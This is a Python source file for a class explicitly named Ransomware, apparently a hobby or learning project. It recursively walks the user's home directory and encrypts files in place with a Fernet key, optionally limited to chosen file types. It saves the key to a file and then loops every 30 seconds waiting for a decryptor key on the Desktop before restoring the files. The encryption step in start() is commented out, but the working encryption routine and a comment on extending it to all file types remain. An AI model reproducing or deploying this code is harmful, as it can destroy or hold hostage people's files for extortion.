import os
import time
from cryptography.fernet import Fernet
from keyManager import KeyManager


class Ransomware:
	def __init__(self, start_folder=os.path.expanduser('~'), key_manager = KeyManager(), filetype = None):
		key_manager.create_asymmetric_key(2048)
		self.start_folder = start_folder
		self.encryption_key = key_manager.symmetric_key()

		self.public_key = key_manager.public_key

		if filetype is None:
			self.filetypes = filetype  # remove this line if you want the ransomeware to encrypt all file types
		else:
			assert isinstance(filetype, tuple), "file type must be tuple"
			self.filetypes = filetype
	

	def traverse_path(self, operation):
		for path, directory, files in  os.walk(top=self.start_folder, topdown=True):
			for file in files:
				file = os.path.join(path, file)
				if self.filetypes is not None:
					if file.endswith(self.filetypes):
						operation(file)
				else:
					operation(file)
			

	def __cryptor(self, file, encrypt=True):
		# open the file for encrption
		try:
			with open(file, 'rb') as current_file:
				key = Fernet(self.encryption_key)
				filecontent = current_file.read()
				filecontent = key.encrypt(filecontent) if encrypt else key.decrypt(filecontent)
			
			# open the file again for write operation
			with open(file, "wb") as current_file:
				current_file.write(filecontent)

		except Exception as err:
			print(err)
	
	def __decryptor(self):
		key_location = os.path.expanduser('~') + r"\Desktop\decryptor.key"
		while True:  # this loop will run until the program detects the decryption key
			if os.path.exists(key_location):
				with open(key_location, 'rb') as key_file:
					self.encryption_key = key_file.read()
				self.traverse_path(lambda file: self.__cryptor(file, encrypt=False))
				break
				
			time.sleep(30)  # check every 30 seconds for the key
	
	def __save_key(self):
		# saving the encryption key 
		with open('decryptor.key', 'wb') as key_file:
			key_file.write(self.encryption_key)

	def __show_message(self):
		pass

	def start(self):
		""" self.traverse_path(lambda file: self.__cryptor(file))
		self.__save_key()
		self.encryption_key = None """
		self.__decryptor()  # this will run in the background and check for the decryption key


def main():
	ransomware = Ransomware()
	ransomware.start()
	

main()
